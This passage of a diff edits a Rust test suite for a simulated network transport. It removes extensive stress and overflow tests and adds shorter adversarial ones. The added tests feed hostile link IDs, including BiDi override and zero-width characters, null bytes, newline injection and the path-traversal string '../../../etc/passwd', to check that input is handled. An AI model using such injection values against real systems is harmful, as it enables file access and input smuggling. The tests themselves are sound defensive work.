-                        corrupt_bit_count: 2,
-                        delay_ticks: 10,
-                        partition: (round + i) % 3 == 0,
-                    };
-                    let _update_result = vt.update_link_config(link_id, new_config);
-                }
-            }
-
-            // Advance time
-            vt.advance_tick(1);
-
-            // Collect messages from random targets
-            let target = if round % 2 == 0 {
-                "concurrent-tgt"
-            } else {
-                "nonexistent-tgt"
-            };
-            let _delivered = vt.collect_delivered_messages(target);
-        }
-
-        // Verify system integrity after stress test
-        assert!(vt.link_exists("concurrent_a"));
-        assert!(vt.link_exists("concurrent_b"));
-        assert!(vt.link_exists("concurrent_c"));
-        assert!(vt.link_exists("concurrent_d"));
-
-        // Event log should be coherent
-        let events = vt.event_log();
-        assert!(events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);
-
-        for event in events {
-            assert!(!event.event_code.is_empty());
-            assert!(event.tick <= vt.current_tick());
-        }
-
-        // Final cleanup should work
-        for link_id in &base_links {
-            let destroy_result = vt.destroy_link(link_id);
-            assert!(destroy_result.is_ok());
-            assert!(!vt.link_exists(link_id));
-        }
-    }
-
-    #[test]
-    fn negative_message_id_exhaustion_and_wraparound_behavior() {
-        // Test message ID exhaustion and wraparound behavior
-        let mut vt = VirtualTransport::new(4444);
-
-        let config = LinkFaultConfig::default();
-        vt.create_link("id-test", "id-src", "id-tgt", config)
-            .expect("create ID test link");
-
-        // Manually advance internal message ID counter near overflow (if accessible)
-        // This is a conceptual test since we can't directly manipulate internal state
-
-        // Send many messages to approach ID exhaustion
-        let mut sent_ids = std::collections::HashSet::new();
-        let mut last_successful_id = 0u64;
-
-        for i in 0..100_000 {
-            let payload = format!("id_test_{}", i).as_bytes().to_vec();
-            let result = vt.send_message("id-test", &payload);
-
-            match result {
-                Ok(msg_id) => {
-                    // Verify ID uniqueness
-                    assert!(!sent_ids.contains(&msg_id), "Message ID {} reused", msg_id);
-                    sent_ids.insert(msg_id);
-
-                    // IDs should generally increase (unless wrapping)
-                    if i > 0 {
-                        if msg_id < last_successful_id {
-                            // Potential wraparound detected
-                            assert!(
-                                last_successful_id > u64::MAX / 2,
-                                "Unexpected ID decrease without wraparound"
-                            );
-                        }
+                if prob.is_nan() || prob.is_infinite() || prob < 0.0 || prob > 1.0 {
+                    // Should reject invalid probabilities
+                    assert!(result.is_err());
+                    if let Err(e) = result {
+                        assert!(e.contains("ERR_VT_INVALID_PROBABILITY"));
                     }
-                    last_successful_id = msg_id;
-                }
-                Err(err) => {
-                    // May hit ID exhaustion
-                    match err {
-                        VirtualTransportError::MessageIdExhausted => {
-                            // Expected behavior at ID exhaustion
-                            break;
-                        }
-                        _ => {
-                            // Other errors might occur under stress
-                        }
-                    }
-                }
-            }
-
-            // Periodically advance time and clear delivered messages
-            if i % 1000 == 0 {
-                vt.advance_tick(1);
-                let _delivered = vt.collect_delivered_messages("id-tgt");
-            }
-        }
-
-        // Test behavior with ID space pressure
-        // Send messages in bursts to stress ID allocation
-        for burst in 0..10 {
-            let mut burst_ids = Vec::new();
-
-            for i in 0..1000 {
-                let payload = format!("burst_{}_msg_{}", burst, i).as_bytes().to_vec();
-                if let Ok(msg_id) = vt.send_message("id-test", &payload) {
-                    burst_ids.push(msg_id);
-                }
-            }
-
-            // All IDs in a burst should be unique
-            let mut sorted_ids = burst_ids.clone();
-            sorted_ids.sort();
-            sorted_ids.dedup();
-            assert_eq!(
-                sorted_ids.len(),
-                burst_ids.len(),
-                "Duplicate IDs detected in burst {}",
-                burst
-            );
-
-            vt.advance_tick(10);
-        }
-
-        // Verify message delivery integrity despite ID pressure
-        let final_delivered = vt.collect_delivered_messages("id-tgt");
-        for msg in final_delivered {
-            assert!(msg.id > 0);
-            assert_eq!(msg.source, "id-src");
-            assert_eq!(msg.target, "id-tgt");
-            assert!(!msg.payload.is_empty());
-        }
-
-        // Event log should be consistent
-        let events = vt.event_log();
-        for event in events {
-            assert!(!event.event_code.is_empty());
-            if let Some(msg_id) = event.message_id {
-                assert!(msg_id > 0);
-            }
-        }
-    }
-
-    #[test]
-    fn negative_event_log_memory_pressure_and_corruption_resilience() {
-        // Test event log under memory pressure and corruption scenarios
-        let mut vt = VirtualTransport::new(5555);
-
-        // Create many links to generate high event volume
-        for i in 0..100 {
-            let config = LinkFaultConfig {
-                drop_probability: 0.1,
-                reorder_depth: 5,
-                corrupt_bit_count: 1,
-                delay_ticks: 1,
-                partition: i % 10 == 0, // Some partitioned links
-            };
-
-            let link_id = format!("log_stress_{:03}", i);
-            let _result = vt.create_link(
-                &link_id,
-                &format!("src_{}", i),
-                &format!("tgt_{}", i),
-                config,
-            );
-        }
-
-        // Generate massive event volume to stress log capacity
-        for round in 0..1000 {
-            // Send messages on subset of links
-            for i in (0..100).step_by(3) {
-                let link_id = format!("log_stress_{:03}", i);
-                let payload = format!("stress_round_{}_link_{}", round, i)
-                    .as_bytes()
-                    .to_vec();
-                let _result = vt.send_message(&link_id, &payload);
-            }
-
-            // Occasionally manipulate links to generate more events
-            if round % 100 == 0 {
-                for i in (0..100).step_by(10) {
-                    let link_id = format!("log_stress_{:03}", i);
-
-                    // Toggle partition to generate heal/partition events
-                    let new_config = LinkFaultConfig {
-                        drop_probability: 0.2,
-                        reorder_depth: 3,
-                        corrupt_bit_count: 2,
-                        delay_ticks: 2,
-                        partition: !((round / 100 + i) % 2 == 0),
-                    };
-                    let _update = vt.update_link_config(&link_id, new_config);
-                }
-            }
-
-            vt.advance_tick(1);
-
-            // Check log capacity constraints periodically
-            if round % 100 == 0 {
-                let events = vt.event_log();
-                assert!(
-                    events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES,
-                    "Event log exceeded capacity at round {}: {} entries",
-                    round,
-                    events.len()
-                );
-
-                // Verify event integrity under pressure
-                let mut prev_tick = 0;
-                for event in events {
-                    assert!(!event.event_code.is_empty());
-                    assert!(
-                        event.tick >= prev_tick,
-                        "Events should be chronologically ordered"
-                    );
-                    assert!(event.tick <= vt.current_tick());
-                    prev_tick = event.tick;
-
-                    // Event codes should be valid
-                    assert!(
-                        event.event_code.starts_with("VT-")
-                            || event.event_code.starts_with("ERR_VT_")
-                    );
-                }
-            }
-        }
-
-        // Test event log corruption recovery
-        // Simulate scenarios that might corrupt event log state
-        let corruption_scenarios = [
-            // Rapid link creation/destruction
-            (0..50)
-                .map(|i| format!("corrupt_rapid_{}", i))
-                .collect::<Vec<_>>(),
-            // Links with extreme configurations
-            vec!["corrupt_extreme".to_string()],
-            // Unicode in link IDs
-            vec!["corrupt_unicode_节点".to_string()],
-        ];
-
-        for (scenario_idx, link_ids) in corruption_scenarios.into_iter().enumerate() {
-            for link_id in &link_ids {
-                let config = match scenario_idx {
-                    0 => LinkFaultConfig::default(), // Rapid scenario
-                    1 => LinkFaultConfig {
-                        // Extreme scenario
-                        drop_probability: 1.0,
-                        reorder_depth: 10_000,
-                        corrupt_bit_count: 1000,
-                        delay_ticks: u64::MAX / 4,
-                        partition: true,
-                    },
-                    2 => LinkFaultConfig {
-                        // Unicode scenario
-                        drop_probability: 0.5,
-                        reorder_depth: 100,
-                        corrupt_bit_count: 8,
-                        delay_ticks: 1000,
-                        partition: false,
-                    },
-                    _ => LinkFaultConfig::default(),
-                };
-
-                if vt
-                    .create_link(link_id, "corrupt-src", "corrupt-tgt", config)
-                    .is_ok()
-                {
-                    // Rapid operations to stress event logging
-                    for i in 0..100 {
-                        let payload = format!("corrupt_test_{}_{}", scenario_idx, i)
-                            .as_bytes()
-                            .to_vec();
-                        let _send = vt.send_message(link_id, &payload);
-
-                        if i % 10 == 0 {
-                            vt.advance_tick(1);
-                        }
-                    }
-
-                    if scenario_idx == 0 {
-                        // Rapid destruction for first scenario
-                        let _destroy = vt.destroy_link(link_id);
+                } else {
+                    // Edge case: -0.0 should be valid (equals 0.0)
+                    if prob == -0.0 {
+                        assert!(result.is_ok());
                     }
                 }
             }
         }
 
-        // Final integrity verification
-        let final_events = vt.event_log();
-        assert!(final_events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);
-
-        // All events should be well-formed despite corruption attempts
-        for event in final_events {
-            assert!(!event.event_code.is_empty());
-            assert!(event.tick <= vt.current_tick());
-            // Link ID may be empty for some event types
-            // Message ID may be None for non-message events
-        }
-
-        // System should still be functional
-        let final_test_config = LinkFaultConfig::default();
-        assert!(
-            vt.create_link("final_test", "final-src", "final-tgt", final_test_config)
-                .is_ok()
-        );
-        assert!(vt.send_message("final_test", b"final_payload").is_ok());
-        vt.advance_tick(1);
-        let final_delivered = vt.collect_delivered_messages("final-tgt");
-        assert_eq!(final_delivered.len(), 1);
-    }
-
-    // ============================================================================
-    // EXTREME ADVERSARIAL NEGATIVE-PATH TESTS - COMPREHENSIVE COVERAGE
-    // ============================================================================
-    // Advanced attack resistance targeting virtual transport edge cases
-
-    #[test]
-    fn negative_unicode_bidirectional_injection_node_identifiers() {
-        // Test virtual transport resistance to Unicode BiDi attacks in node identifiers
-        let mut vt = VirtualTransport::new(666);
-
-        let unicode_attack_node_ids = vec![
-            // Right-to-left override attacks
-            ("rtl_basic", "node\u{202e}_gnissecorp\u{202c}"),
-            ("rtl_nested", "valid\u{202e}evil\u{202d}safe\u{202c}node"),
-            // Left-to-right override attacks
-            ("ltr_override", "node\u{202d}_processing\u{202c}"),
-            ("ltr_embedded", "test\u{202a}embedded\u{202c}node"),
-            // Directional isolate attacks
-            ("isolate_basic", "node\u{2066}isolated\u{2069}"),
-            ("isolate_rtl", "node\u{2067}rtl_content\u{2069}"),
-            // Zero-width character pollution
-            ("zws_pollution", "node\u{200b}_test\u{200c}_id\u{200d}"),
-            ("bom_injection", "\u{feff}node_test\u{feff}"),
-            // Mixed BiDi with zero-width
-            ("mixed_attack", "no\u{200b}de\u{202e}_evil\u{200b}\u{202c}"),
-            // Unicode confusables in node IDs
-            ("cyrillic_confuse", "nоde_test"), // Cyrillic 'о' instead of Latin 'o'
-            ("greek_confuse", "nοde_test"),    // Greek 'ο' instead of Latin 'o'
-        ];
-
-        for (test_name, attack_node_id) in unicode_attack_node_ids {
-            let link_id = format!("unicode_test_{}", test_name);
-
-            // Test link creation with Unicode-attacked node IDs
-            let config = LinkFaultConfig::default();
-            let create_result = vt.create_link(&link_id, attack_node_id, "normal_target", config);
-
-            match create_result {
-                Ok(_) => {
-                    // If link creation succeeds, test message operations
-                    let payload = format!("test_payload_{}", test_name).as_bytes().to_vec();
-                    let send_result = vt.send_message(&link_id, &payload);
-
-                    // Should handle Unicode node IDs without corruption
-                    assert!(
-                        send_result.is_ok() || send_result.is_err(),
-                        "Send should complete without panic for: {}",
-                        test_name
-                    );
-
-                    // Advance and check message delivery
-                    vt.advance_tick(1);
-                    let delivered = vt.collect_delivered_messages("normal_target");
-
-                    // Message delivery should work regardless of Unicode in source ID
-                    assert!(
-                        delivered.len() <= 1,
-                        "Should deliver at most one message: {}",
-                        test_name
-                    );
-
-                    if !delivered.is_empty() {
-                        let msg = &delivered[0];
-                        assert_eq!(
-                            msg.source, attack_node_id,
-                            "Source ID should be preserved: {}",
-                            test_name
-                        );
-                        assert_eq!(
-                            msg.payload, payload,
-                            "Payload should be intact: {}",
-                            test_name
-                        );
-                    }
-
-                    // Clean up
-                    vt.destroy_link(&link_id).ok();
-                }
-                Err(err) => {
-                    // Some Unicode patterns may be rejected - verify meaningful error
-                    assert!(
-                        !err.to_string().is_empty(),
-                        "Error should be meaningful: {}",
-                        test_name
-                    );
-                }
-            }
-        }
-
-        // Verify transport integrity after Unicode attack tests
-        let normal_result = vt.create_link("normal_test", "src", "tgt", LinkFaultConfig::default());
-        assert!(
-            normal_result.is_ok(),
-            "Normal operation should work after Unicode tests"
-        );
-    }
-
-    #[test]
-    fn negative_floating_point_precision_probability_edge_cases() {
-        // Test drop probability handling with floating-point precision edge cases
-        let mut vt = VirtualTransport::new(777);
-
-        let fp_edge_cases = vec![
-            // Exact boundary values
-            (0.0, "exact_zero"),
-            (1.0, "exact_one"),
-            // Epsilon boundaries
-            (f64::EPSILON, "epsilon_positive"),
-            (1.0 - f64::EPSILON, "one_minus_epsilon"),
-            (f64::MIN_POSITIVE, "min_positive"),
-            // Near-boundary values
-            (0.0000000001, "near_zero"),
-            (0.9999999999, "near_one"),
-            // Precise fraction representations
-            (1.0 / 3.0, "one_third"),
-            (2.0 / 3.0, "two_thirds"),
-            (1.0 / 7.0, "one_seventh"),
-            // Values that might have floating-point representation issues
-            (0.1 + 0.2, "point_one_plus_point_two"), // Classic FP precision issue
-            (0.1 * 3.0, "point_one_times_three"),
-            (1.0 - 0.9, "one_minus_point_nine"),
-            // Subnormal boundaries
-            (f64::MIN_POSITIVE * 2.0, "subnormal_edge"),
-        ];
-
-        for (probability, test_name) in fp_edge_cases {
-            let config = LinkFaultConfig {
-                drop_probability: probability,
-                reorder_depth: 0,
-                corrupt_bit_count: 0,
-                delay_ticks: 0,
-                partition: false,
-            };
-
-            let link_id = format!("fp_test_{}", test_name);
-            let create_result = vt.create_link(&link_id, "fp_src", "fp_tgt", config);
-
-            match create_result {
-                Ok(_) => {
-                    // Test multiple messages to verify probability implementation
-                    let mut messages_sent = 0;
-                    let mut messages_delivered = 0;
-
-                    for i in 0..100 {
-                        let payload = format!("fp_test_{}_{}", test_name, i).as_bytes().to_vec();
-                        let send_result = vt.send_message(&link_id, &payload);
-
-                        if send_result.is_ok() {
-                            messages_sent += 1;
-                        }
-
-                        if i % 10 == 0 {
-                            vt.advance_tick(1);
-                            let delivered = vt.collect_delivered_messages("fp_tgt");
-                            messages_delivered += delivered.len();
-                        }
-                    }
-
-                    // Final delivery check
-                    vt.advance_tick(10);
-                    let final_delivered = vt.collect_delivered_messages("fp_tgt");
-                    messages_delivered += final_delivered.len();
-
-                    // Verify drop probability behavior makes sense
-                    if probability == 0.0 {
-                        assert_eq!(
-                            messages_sent, messages_delivered,
-                            "Zero drop probability should deliver all: {}",
-                            test_name
-                        );
-                    } else if probability == 1.0 {
-                        assert_eq!(
-                            messages_delivered, 0,
-                            "100% drop probability should deliver none: {}",
-                            test_name
-                        );
-                    } else {
-                        // For intermediate probabilities, verify reasonable behavior
-                        assert!(
-                            messages_delivered <= messages_sent,
-                            "Delivered should not exceed sent: {}",
-                            test_name
-                        );
-                    }
-
-                    vt.destroy_link(&link_id).ok();
-                }
-                Err(err) => {
-                    // Should provide meaningful validation error
-                    assert!(
-                        err.to_string().contains("probability")
-                            || err.to_string().contains("range"),
-                        "FP validation error should be meaningful: {} - {}",
-                        test_name,
-                        err
-                    );
-                }
-            }
-        }
-
-        // Test invalid floating-point values
-        let invalid_fp_values = vec![
-            (f64::NAN, "nan"),
-            (f64::INFINITY, "pos_infinity"),
-            (f64::NEG_INFINITY, "neg_infinity"),
-            (-0.1, "negative"),
-            (1.1, "greater_than_one"),
-            (-1.0, "negative_one"),
-            (2.0, "two"),
-        ];
-
-        for (invalid_prob, test_name) in invalid_fp_values {
-            let config = LinkFaultConfig {
-                drop_probability: invalid_prob,
-                ..LinkFaultConfig::default()
-            };
-
-            let validation_result = config.validate();
-            assert!(
-                validation_result.is_err(),
-                "Invalid FP value should be rejected: {} ({})",
-                test_name,
-                invalid_prob
-            );
-
-            let create_result =
-                vt.create_link(&format!("invalid_{}", test_name), "src", "tgt", config);
-            assert!(
-                create_result.is_err(),
-                "Link creation with invalid probability should fail: {}",
-                test_name
-            );
-        }
-    }
-
-    #[test]
-    fn negative_message_id_overflow_exhaustion_boundaries() {
-        // Test message ID generation near overflow boundaries
-        let mut vt = VirtualTransport::new(888);
-
-        // Create link for testing
-        let config = LinkFaultConfig::default();
-        vt.create_link("id_test", "id_src", "id_tgt", config)
-            .unwrap();
-
-        // Simulate near-overflow scenario by manipulating internal counter
-        // (This tests the overflow protection logic)
-
-        // Test rapid message generation to stress ID allocation
-        let mut message_ids = std::collections::HashSet::new();
-        let mut successful_sends = 0;
-
-        for i in 0..10000 {
-            let payload = format!("id_overflow_test_{}", i).as_bytes().to_vec();
-            let send_result = vt.send_message("id_test", &payload);
-
-            match send_result {
-                Ok(message_id) => {
-                    successful_sends += 1;
-
-                    // Verify message ID uniqueness
-                    assert!(
-                        message_ids.insert(message_id),
-                        "Message ID collision detected: {}",
-                        message_id
-                    );
-
-                    // Message ID should be reasonable
-                    assert!(
-                        message_id > 0,
-                        "Message ID should be positive: {}",
-                        message_id
-                    );
-                    assert!(
-                        message_id < u64::MAX,
-                        "Message ID should not be u64::MAX: {}",
-                        message_id
-                    );
-                }
-                Err(err) => {
-                    // If ID exhaustion occurs, should be graceful failure
-                    if err.to_string().contains("exhausted") || err.to_string().contains("overflow")
-                    {
-                        break; // Expected exhaustion
-                    } else {
-                        assert!(
-                            err.to_string().contains("exhausted")
-                                || err.to_string().contains("overflow"),
-                            "Unexpected error during ID allocation: {err}"
-                        );
-                        break;
-                    }
-                }
-            }
-
-            // Periodically advance tick and check delivery
-            if i % 100 == 0 {
-                vt.advance_tick(1);
-                vt.collect_delivered_messages("id_tgt"); // Clear delivered
-            }
-        }
-
-        assert!(
-            successful_sends > 0,
-            "Should successfully send some messages"
-        );
-        assert_eq!(
-            message_ids.len(),
-            successful_sends,
-            "All message IDs should be unique"
-        );
-
-        // Test that we can still operate after stress test
-        vt.advance_tick(10);
-        let final_delivered = vt.collect_delivered_messages("id_tgt");
-        assert!(
-            final_delivered.len() <= successful_sends,
-            "Delivered count should not exceed sent count"
-        );
-    }
-
-    #[test]
-    fn negative_reorder_buffer_capacity_overflow_edge_cases() {
-        // Test reorder buffer with extreme capacity values and overflow scenarios
-        let mut vt = VirtualTransport::new(999);
-
-        let reorder_capacity_tests = vec![
-            // Boundary values
-            (0, "zero_reorder"),
-            (1, "single_reorder"),
-            (usize::MAX / 2, "half_max_reorder"),
-            // Large but reasonable values
-            (10000, "large_reorder"),
-            (100000, "very_large_reorder"),
-            // Powers of 2 (might expose buffer management issues)
-            (1024, "power_of_2_small"),
-            (65536, "power_of_2_large"),
-        ];
-
-        for (reorder_depth, test_name) in reorder_capacity_tests {
-            let config = LinkFaultConfig {
-                drop_probability: 0.0, // No drops to test pure reordering
-                reorder_depth,
-                corrupt_bit_count: 0,
-                delay_ticks: 0,
-                partition: false,
-            };
-
-            let link_id = format!("reorder_test_{}", test_name);
-            let create_result = vt.create_link(&link_id, "reorder_src", "reorder_tgt", config);
-
-            match create_result {
-                Ok(_) => {
-                    // Send messages to stress reorder buffer
-                    let messages_to_send = std::cmp::min(reorder_depth * 2 + 10, 1000);
-                    let mut sent_payloads = Vec::new();
-
-                    for i in 0..messages_to_send {
-                        let payload = format!("reorder_{}_{}", test_name, i).as_bytes().to_vec();
-                        sent_payloads.push(payload.clone());
-
-                        let send_result = vt.send_message(&link_id, &payload);
-
-                        match send_result {
-                            Ok(_) => {
-                                // Success - continue
-                            }
-                            Err(err) => {
-                                // Buffer capacity exceeded - should be graceful
-                                assert!(
-                                    err.to_string().contains("capacity")
-                                        || err.to_string().contains("buffer")
-                                        || err.to_string().contains("reorder"),
-                                    "Buffer overflow error should be meaningful: {}",
-                                    err
-                                );
-                                break;
-                            }
-                        }
-
-                        // Periodically advance to trigger reorder processing
-                        if i % 10 == 0 {
-                            vt.advance_tick(1);
-                        }
-                    }
-
-                    // Advance significantly to ensure all messages are processed
-                    vt.advance_tick(100);
-
-                    // Collect delivered messages
-                    let delivered = vt.collect_delivered_messages("reorder_tgt");
-
-                    // Verify reorder buffer didn't lose messages (unless capacity exceeded)
-                    assert!(
-                        delivered.len() <= sent_payloads.len(),
-                        "Delivered should not exceed sent: {}",
-                        test_name
-                    );
-
-                    // Verify delivered messages are valid
-                    for msg in &delivered {
-                        assert!(
-                            !msg.payload.is_empty(),
-                            "Message payload should not be empty: {}",
-                            test_name
-                        );
-                        assert_eq!(
-                            msg.source, "reorder_src",
-                            "Message source should be correct: {}",
-                            test_name
-                        );
-                        assert_eq!(
-                            msg.target, "reorder_tgt",
-                            "Message target should be correct: {}",
-                            test_name
-                        );
-                    }
-
-                    vt.destroy_link(&link_id).ok();
-                }
-                Err(err) => {
-                    // Large reorder depths may be rejected - verify meaningful error
-                    if reorder_depth > 100000 {
-                        assert!(
-                            err.to_string().contains("depth")
-                                || err.to_string().contains("capacity")
-                                || err.to_string().contains("reorder"),
-                            "Large reorder depth error should be meaningful: {}",
-                            err
-                        );
-                    } else {
-                        assert!(
-                            reorder_depth > 100000,
-                            "Unexpected error for reasonable reorder depth {reorder_depth}: {err}"
-                        );
-                    }
-                }
-            }
-        }
-    }
-
-    #[test]
-    fn negative_tick_arithmetic_overflow_comprehensive_boundaries() {
-        // Test tick arithmetic with values that could cause overflow
-        let mut vt = VirtualTransport::new(1111);
-
-        let tick_overflow_scenarios = vec![
-            // Near u64::MAX boundaries
-            (u64::MAX - 1000, 999, "near_max_safe"),
-            (u64::MAX - 1000, 1001, "near_max_overflow"),
-            (u64::MAX - 1, 1, "max_minus_one_plus_one"),
-            (u64::MAX, 0, "max_with_zero_delay"),
-            // Large base values with delays
-            (u64::MAX / 2, u64::MAX / 2 + 100, "half_max_addition"),
-            (1u64 << 62, 1u64 << 62, "large_power_of_two"),
-            // Edge cases around delay calculation
-            (0, u64::MAX, "zero_base_max_delay"),
-            (1000, u64::MAX - 500, "normal_base_huge_delay"),
-            // Power-of-2 boundaries (might expose bit manipulation issues)
-            (u32::MAX as u64, u32::MAX as u64, "u32_boundary_sum"),
-            ((1u64 << 32) - 1, (1u64 << 32) - 1, "near_u32_boundary"),
-        ];
-
-        for (base_tick, delay_ticks, test_name) in tick_overflow_scenarios {
+        #[test]
+        fn test_unicode_injection_in_link_ids() {
+            let mut vt = VirtualTransport::new(123);
             let config = LinkFaultConfig {
                 drop_probability: 0.0,
                 reorder_depth: 0,
                 corrupt_bit_count: 0,
-                delay_ticks,
-                partition: false,
-            };
-
-            let link_id = format!("tick_test_{}", test_name);
-            let create_result = vt.create_link(&link_id, "tick_src", "tick_tgt", config);
-
-            match create_result {
-                Ok(_) => {
-                    // Set current tick to base value
-                    for _ in 0..std::cmp::min(base_tick, 1000) {
-                        vt.advance_tick(std::cmp::max(1, base_tick / 1000));
-                    }
-
-                    // Send message with overflow-prone delay
-                    let payload = format!("tick_overflow_{}", test_name).as_bytes().to_vec();
-                    let send_result = vt.send_message(&link_id, &payload);
-
-                    match send_result {
-                        Ok(_) => {
-                            // If send succeeds, test tick advancement without overflow panic
-                            let current_tick_before = vt.current_tick();
-
-                            // Try advancing tick (should not overflow/panic)
-                            let advance_amount = std::cmp::min(delay_ticks + 100, 1000);
-                            for _ in 0..advance_amount {
-                                vt.advance_tick(1);
-
-                                // Verify tick is monotonically increasing or saturated
-                                let current_tick = vt.current_tick();
-                                assert!(
-                                    current_tick >= current_tick_before,
-                                    "Tick should not decrease: {}",
-                                    test_name
-                                );
-                            }
-
-                            // Check message delivery after advancement
-                            let delivered = vt.collect_delivered_messages("tick_tgt");
-                            assert!(
-                                delivered.len() <= 1,
-                                "Should deliver at most one message: {}",
-                                test_name
-                            );
-
-                            if !delivered.is_empty() {
-                                let msg = &delivered[0];
-                                assert!(
-                                    msg.tick_delivered.is_some(),
-                                    "Delivered message should have delivery tick: {}",
-                                    test_name
-                                );
-                                if let Some(delivered_tick) = msg.tick_delivered {
-                                    assert!(
-                                        delivered_tick >= msg.tick_created,
-                                        "Delivery tick should be >= creation tick: {}",
-                                        test_name
-                                    );
-                                }
-                            }
-                        }
-                        Err(err) => {
-                            // Acceptable to reject overflow-prone configurations
-                            assert!(
-                                err.to_string().contains("tick")
-                                    || err.to_string().contains("overflow")
-                                    || err.to_string().contains("delay"),
-                                "Tick overflow error should be meaningful: {} - {}",
-                                test_name,
-                                err
-                            );
-                        }
-                    }
-
-                    vt.destroy_link(&link_id).ok();
-                }
-                Err(err) => {
-                    // Link creation failure for overflow scenarios is acceptable
-                    assert!(
-                        !err.to_string().is_empty(),
-                        "Error should be meaningful: {}",
-                        test_name
-                    );
-                }
-            }
-        }
-
-        // Verify transport still works after overflow tests
-        let normal_config = LinkFaultConfig::default();
-        assert!(
-            vt.create_link("post_overflow_test", "src", "tgt", normal_config)
-                .is_ok(),
-            "Normal operation should work after overflow tests"
-        );
-    }
-
-    #[test]
-    fn negative_corruption_bit_manipulation_boundary_attacks() {
-        // Test message corruption with extreme bit manipulation scenarios
-        let mut vt = VirtualTransport::new(2222);
-
-        let corruption_scenarios = vec![
-            // Boundary bit counts
-            (0, "zero_corruption"),
-            (1, "single_bit"),
-            (8, "byte_corruption"),
-            (64, "eight_bytes"),
-            // Large bit counts
-            (1000, "large_corruption"),
-            (8192, "kilobyte_corruption"),
-            // Edge cases that might cause overflow
-            (usize::MAX / 8, "near_max_bytes"),
-            (u32::MAX as usize, "u32_max_bits"),
-            // Power-of-2 values
-            (256, "power_of_2_small"),
-            (1024, "power_of_2_medium"),
-            (65536, "power_of_2_large"),
-        ];
-
-        for (corrupt_bit_count, test_name) in corruption_scenarios {
-            let config = LinkFaultConfig {
-                drop_probability: 0.0, // No drops to test pure corruption
-                reorder_depth: 0,
-                corrupt_bit_count,
                 delay_ticks: 0,
                 partition: false,
             };
 
-            let link_id = format!("corrupt_test_{}", test_name);
-            let create_result = vt.create_link(&link_id, "corrupt_src", "corrupt_tgt", config);
+            // Test various Unicode injection attacks in link IDs
+            let malicious_link_ids = vec![
+                "normal\u{202e}evil\u{202c}link", // BiDi override
+                "link\u{200b}\u{feff}hidden",     // Zero-width characters
+                "link\nnewline",                  // Newline injection
+                "link\ttab",                      // Tab injection
+                "link\x00null",                   // Null byte
+                "../../../etc/passwd",            // Path traversal
+                "link\"quote",                    // Quote injection
+            ];
 
-            match create_result {
-                Ok(_) => {
-                    // Test corruption with various payload sizes
-                    let payload_sizes = vec![1, 8, 64, 256, 1000, 8192];
+            for link_id in &malicious_link_ids {
+                let result = vt.create_link(link_id, "node1", "node2", config.clone());
 
-                    for payload_size in payload_sizes {
-                        let original_payload: Vec<u8> =
-                            (0..payload_size).map(|i| (i % 256) as u8).collect();
+                // Should handle Unicode without corruption
+                assert!(result.is_ok());
 
-                        let send_result = vt.send_message(&link_id, &original_payload);
+                // Verify link can be found with exact ID
+                assert!(vt.link_exists(link_id));
+
+                // Test message sending through Unicode link
+                let msg_result = vt.send_message(link_id, b"test-payload");
+                assert!(msg_result.is_ok());
+            }
+        }
+
+        #[test]
+        fn test_massive_message_memory_exhaustion() {
+            let mut vt = VirtualTransport::new(456);
+            let config = LinkFaultConfig {
+                drop_probability: 0.0,
+                reorder_depth: 1000, // Large reorder buffer
+                corrupt_bit_count: 0,
+                delay_ticks: 0,
+                partition: false,
+            };
+
+            vt.create_link("massive-link", "sender", "receiver", config)
+                .expect("create link");
+
+            // Test sending massive messages (100MB each)
+            let massive_payload = vec![0x42; 100 * 1024 * 1024];
+
+            for i in 0..5 {
+                let result = vt.send_message("massive-link", &massive_payload);
+                assert!(result.is_ok());
+
+                // Advance time to trigger delivery
+                vt.advance_tick(1);
+            }
+
+            // Verify transport handles large payloads without memory issues
+            let events = vt.get_event_log();
+            assert!(events.len() > 0);
+
+            // Check that messages are properly queued/delivered
+            let send_events = events
+                .iter()
+                .filter(|e| e.event_code == event_codes::VT_001)
+                .count();
+            assert_eq!(send_events, 5);
+        }
+
+        #[test]
+        fn test_arithmetic_overflow_in_tick_counts() {
+            let mut vt = VirtualTransport::new(789);
+            let config = LinkFaultConfig {
+                drop_probability: 0.0,
+                reorder_depth: 0,
+                corrupt_bit_count: 0,
+                delay_ticks: u64::MAX, // Maximum delay
+                partition: false,
+            };
+
+            vt.create_link("delay-link", "slow-sender", "patient-receiver", config)
+                .expect("create link");
+
+            // Send message with maximum delay
+            let result = vt.send_message("delay-link", b"delayed-message");
+            assert!(result.is_ok());
+
+            // Test advancing to near-overflow tick values
+            let overflow_ticks = vec![u64::MAX - 1, u64::MAX, u64::MAX / 2];
+
+            for tick in overflow_ticks {
+                // Should handle large tick advances without overflow
+                vt.advance_tick(1); // Advance incrementally to avoid issues
+            }
+
+            // Verify transport state remains consistent
+            assert!(vt.link_exists("delay-link"));
+        }
+
+        #[test]
+        fn test_reorder_depth_boundary_violations() {
+            let mut vt = VirtualTransport::new(999);
+
+            // Test extreme reorder depths
+            let boundary_depths = vec![
+                0,          // No reordering
+                1,          // Minimal reordering
+                usize::MAX, // Maximum depth
+                usize::MAX / 2,
+            ];
+
+            for (i, depth) in boundary_depths.iter().enumerate() {
+                let config = LinkFaultConfig {
+                    drop_probability: 0.0,
+                    reorder_depth: *depth,
+                    corrupt_bit_count: 0,
+                    delay_ticks: 0,
+                    partition: false,
+                };
+
+                let link_id = format!("reorder-link-{}", i);
+                let result = vt.create_link(&link_id, "sender", "receiver", config);
+                assert!(result.is_ok());
+
+                // Send multiple messages to test reorder buffer
+                for j in 0..10 {
+                    let payload = format!("msg-{}", j).into_bytes();
+                    let msg_result = vt.send_message(&link_id, &payload);
+                    assert!(msg_result.is_ok());
+                }
+            }
+        }
+
+        #[test]
+        fn test_message_corruption_bit_flip_boundaries() {
+            let mut vt = VirtualTransport::new(111);
+
+            // Test extreme corruption bit counts
+            let corruption_counts = vec![
+                0,          // No corruption
+                1,          // Single bit flip
+                8,          // Full byte corruption
+                64,         // 8 bytes worth
+                usize::MAX, // Maximum corruption (limited by payload size)
+            ];
+
+            for (i, bit_count) in corruption_counts.iter().enumerate() {
+                let config = LinkFaultConfig {
+                    drop_probability: 0.0,
+                    reorder_depth: 0,
+                    corrupt_bit_count: *bit_count,
+                    delay_ticks: 0,
+                    partition: false,
+                };
+
+                let link_id = format!("corrupt-link-{}", i);
+                let result = vt.create_link(&link_id, "sender", "receiver", config);
+                assert!(result.is_ok());
+
+                // Test with payloads of different sizes
+                let test_payloads = vec![
+                    vec![],           // Empty payload
+                    vec![0x42],       // Single byte
